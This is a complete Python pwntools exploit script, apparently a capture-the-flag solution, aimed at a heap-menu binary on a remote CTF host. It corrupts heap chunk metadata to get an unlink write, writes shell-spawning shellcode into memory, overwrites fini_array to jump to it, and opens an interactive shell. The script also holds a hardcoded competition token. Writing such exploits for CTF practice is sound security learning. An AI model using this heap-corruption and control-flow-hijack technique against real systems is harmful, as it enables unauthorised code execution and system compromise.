#!/usr/bin/env python2

from pwn import *
from qpwn import *
from sys import argv
context(binary='./pwn', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

if args.INFO:
    context.log_level = 'info'
    
DEBUG = not args.REMOTE and not args.TEST
if args.REMOTE:
    p = remote(argv[1], int(argv[2]))
elif args.TEST:
    p = process('./pwn', env={'LD_PRELOAD': './libc.so.6'})
else:
    p = process('./pwn')
elf = ELF('./pwn')
init(p, elf, context, args)
make_alias(p)

p.sl = lambda x: p.send((x + '\n').encode('base64'))
p.s = lambda x: p.send(x.encode('base64'))

def menu(index):
    p.sl(str(index))

def create(size, content):
    menu(1)
    p.sl(str(size))
    p.s(content)

def delete(index):
    menu(2)
    p.sl(str(index))

def edit(index, content):
    menu(3)
    p.sl(str(index))
    p.s(content)

if __name__ == '__main__':
    # ./test.py REMOTE df0a72047d6c.gamectf.com 10001
    if args.REMOTE:
        p.sla('Please input you token:\n', 'icqb35c3bdcb697163e7e3292a531543')
    
    #p.ru('input')
    p.ru('So, please give me a base64 strings:')

    create(0x48, 'a\n')
    create(0x14, 'a\n')
    create(0x14, 'a\n')
    create(0x14, 'a\n')
    create(0x88, 'b\n')
    create(0x18, 'c\n')
    ptr_addr = 0x080EBA00 + 0x4 * 16 + 0x4 * 3
    edit(3, 'a' * 0x14)
    edit(3, flat('a' * 4, 0x11, ptr_addr - 0xc, ptr_addr - 0x8, 0x10, '\x90'))
    delete(4)
    stage_addr = 0x080e9000 + 0x810
    edit(3, flat(stage_addr) + '\n')
    edit(0, asm(shellcraft.sh()) + '\n')
    fini_array = 0x080E9F74
    edit(3, flat(fini_array))
    edit(0, flat(stage_addr, stage_addr) + '\n')
    #gogogo('x /40dx %s' % hex(fini_array))
    #bc(stage_addr)
    menu(4)
    #gogogo('x /40dx 0x080EBA00\nx /20i %s' % hex(stage_addr))
    p.i()
